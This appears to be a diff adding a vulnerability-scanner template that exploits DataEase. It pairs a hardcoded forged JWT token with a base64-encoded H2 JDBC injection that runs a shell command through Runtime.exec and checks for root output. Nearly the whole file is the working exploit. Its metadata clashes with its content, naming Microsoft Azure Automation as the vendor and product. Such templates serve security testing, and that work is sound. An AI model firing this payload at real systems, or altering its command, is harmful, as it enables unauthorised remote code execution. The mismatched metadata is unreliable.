@@ -1,0 +1,35 @@
+id: DataEase-rce
+
+info:
+  name: DataEase-rce
+  author: daffainfo,xstp
+  severity: critical
+  description: rce
+  metadata:
+    max-request: 1
+    vendor: microsoft
+    product: azure_automation_state_configuration
+  tags: DataEase
+
+http:
+  - raw:
+      - |
+        POST /de2api/datasource/getSchema HTTP/1.1
+        Host: {{Hostname}}
+        X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+        Sec-Fetch-Site: same-origin
+        Accept-Language: zh-CN
+        Content-Type: application/json
+        Content-Length: 836
+
+
+        {"id":"","name":"11","description":"","type":"h2","apiConfiguration":[],"paramsConfiguration":[],"enableDataFill":false,"configuration":"eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0O2luXFxpdD1EUk9QIEFMSUFTIElGIEVYSVNUUyBFWEVDXFw7Q1JFQVRcXEUgQUxJQVMgRVhFQyBBUyAkJHZvaWQgZXhlYygpIHRocm93cyBFeGNlcHRpb24ge2phdmEubGFuZy5TdHJpbmcgcyA9IG5ldyBqYXZhLnV0aWwuU2Nhbm5lcihqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhcImlkXCIpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlcihcIlxcQVwiKS5uZXh0KClcXDt0aHJvdyBuZXcgamF2YS5sYW5nLkV4Y2VwdGlvbihzKVxcO30kJFxcO0NBTEwgRVhFQygpXFw7IiwidXJsVHlwZSI6ImpkYmNVcmwiLCJzc2hUeXBlIjoicGFzc3dvcmQiLCJleHRyYVBhcmFtcyI6IiIsInVzZXJuYW1lIjoiMTIzIiwiIHBhc3N3b3JkIjoiMTIzIiwiaG9zdCI6IiIsImF1dGhNZXRob2QiOiIiLCJwb3J0IjowLCJpbml0aWFsUG9vbFNpemUiOjUsIm1pblBvb2xTaXplIjo1LCJtYXhQb29sU2l6ZSI6NSwicXVlcnlUaW1lb3V0IjozMH0"}
+    matchers:
+      - type: word
+        words:
+          - 'uid=0(root) gid=0(root) groups=0'
+          - 'exec()'
+          - 'Exception calling user-defined function'
+        condition: or
